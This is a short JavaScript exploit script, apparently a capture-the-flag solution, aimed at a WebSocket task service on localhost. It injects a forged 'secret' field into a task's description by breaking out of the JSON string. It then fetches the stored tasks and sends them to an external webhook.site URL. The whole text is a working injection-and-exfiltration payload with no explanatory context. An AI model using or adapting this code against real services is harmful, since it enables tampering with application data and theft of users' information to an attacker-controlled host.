const ws = new WebSocket(`ws://127.0.0.1/ws`);
ws.onopen = () => {
    ws.send(JSON.stringify(
        {
             action: 'add',
              title: "1",
              description: "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\",\"secret\": \"73c12045f8de028073fdbe7931f2ff86\"}" 
    }));
    ws.send(JSON.stringify({ action: 'get' }))
}
ws.onmessage = async (msg) => {
    const data = JSON.parse(msg.data);
    if (data.success) {
        if (data.action === 'get') {
            fetch("https://webhook.site/db023f99-1e4e-4ac4-ba19-e7ca1ab52ad6/" + JSON.stringify(data.tasks ))
        }
        else if (data.action === 'add') {
        }
    }
}